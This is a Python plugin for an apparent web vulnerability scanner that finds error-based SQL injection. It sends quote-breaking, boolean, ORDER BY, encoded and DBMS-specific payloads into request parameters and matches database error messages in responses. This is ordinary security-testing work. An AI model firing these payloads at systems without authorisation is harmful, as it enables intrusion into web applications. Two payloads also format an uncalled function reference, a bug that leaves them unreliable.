#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2020/5/10
# JiuZero 2025/3/13

from lib.helper.helper_sqli import Get_sql_errors
from api import generateResponse, random_num, random_str, VulType, Type, KB, PluginBase, conf
from lib.helper.helper_sensitive import sensitive_page_error_message_check
from concurrent.futures import ThreadPoolExecutor, as_completed

class Z0SCAN(PluginBase):
    name = "SQLiError"
    desc = 'SQL Error Finder'

    def condition(self):
        if not KB["WAFSTATE"] and 1 in conf.level:
            return True
        return False
        
    def audit(self):
        if self.condition():
            num = random_num(4)
            s = random_str(4)
            _payloads = [
                '鎈\'"\(',
                "'", "')", "';", '"', '")', '";', ' order By 500 ',
                ") AND {}={} AND ({}={}".format(num, num + 1, num, num),
                " AND {}={}%23".format(num, num + 1),
                " %' AND {}={} AND '%'='".format(num, num + 1), " ') AND {}={} AND ('{}'='{}".format(num, num + 1, s, s),
                " ' AND {}={} AND '{}'='{}".format(num, num + 1, s, s),
                '`', '`)',
                '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C",
                "extractvalue(1,concat(char(126),md5({})))".format(random_num),
                "convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num)
            ]
            iterdatas = self.generateItemdatas()
            with ThreadPoolExecutor(max_workers=None) as executor:
                futures = [
                    executor.submit(self.process, _, _payloads) for _ in iterdatas
                ]
                try:
                    for future in as_completed(futures):
                        future.result()
                except KeyboardInterrupt:
                    executor.shutdown(False)
                
    def process(self, _, _payloads):
        k, v, position = _
        for _payload in _payloads:
            payload = self.insertPayload(k, v, position, _payload)
            r = self.req(position, payload)
            if not r:
                continue
            html = r.text
            for sql_regex, dbms_type in Get_sql_errors():
                match = sql_regex.search(html)
                if match:
                    result = self.new_result()
                    result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.SQLI, position, param=k, payload=payload, msg="DBMS_TYPE Maybe {}; Match {}".format(dbms_type, match.group()))
                    result.add_detail("Request", r.reqinfo, generateResponse(r), "Dbms Maybe {}; Match {}".format(dbms_type, match.group()))
                    self.success(result)
                    return True
            message_lists = sensitive_page_error_message_check(html)
            if message_lists:
                result = self.new_result()
                result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.SQLI, position, param=k, payload=payload, msg="Receive The Error Msg {}".format(repr(message_lists)))
                result.add_detail("Request", r.reqinfo, generateResponse(r), "Receive Error Msg {}".format(repr(message_lists)))
                self.success(result)
                break
    